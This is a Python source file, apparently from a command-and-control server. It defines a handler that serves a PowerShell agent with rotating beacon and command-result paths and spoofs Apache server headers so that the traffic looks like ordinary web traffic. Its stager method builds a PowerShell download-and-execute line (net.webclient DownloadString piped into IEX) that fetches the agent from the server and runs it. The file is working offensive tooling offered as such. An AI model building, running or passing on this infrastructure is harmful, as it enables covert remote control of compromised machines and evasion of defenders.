from handlers.base_handler import BaseHandler
from utils.agent_generator import generate_agent_code, generate_pwsh_base64_str

class AgentHandler(BaseHandler):
    """Handler for agent code delivery requests"""
    
    def handle_agent_request(self):
        """Send PowerShell agent code to client"""
        # Get the server address
        server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
        
        # Get current paths and rotation info
        current_paths = self.path_router.get_current_paths()
        rotation_info = self.path_router.get_rotation_info()
        
        # Get agent configuration from server if available
        agent_config = getattr(self.server, 'agent_config', None)
        
        # Generate the agent code with modular path approach
        agent_code = generate_agent_code(
            server_address=server_address, 
            beacon_path=current_paths["beacon_path"],
            cmd_result_path=current_paths["cmd_result_path"],
            rotation_info=rotation_info,
            agent_config=agent_config
        )

        # Send response with additional headers to look like a real web server
        headers = {
            "Cache-Control": "max-age=3600, must-revalidate",
            "Server": "Apache/2.4.41 (Ubuntu)"
        }
        self.send_response(200, "text/plain", agent_code, headers)
        self.log_message(f"Served agent code to {self.client_address[0]} (size: {len(agent_code)} bytes)")
        
    def handle_stager_request(self):
        """Send Base64 encoded stager to client"""
        # Get the current agent path and server address
        current_paths = self.path_router.get_current_paths()
        agent_path = current_paths["agent_path"]
        server_address = self.server.server_address
        
        # Create the stager code
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{server_address[0]}:{server_address[1]}{agent_path}');IEX($S)"
        
        # Log the stager request
        self.log_message(f"Serving stager code to {self.client_address[0]}")
        
        # Send response with additional headers
        headers = {
            "Cache-Control": "max-age=3600, must-revalidate",
            "Server": "Apache/2.4.41 (Ubuntu)"
        }
        self.send_response(200, "text/plain", stager_code, headers)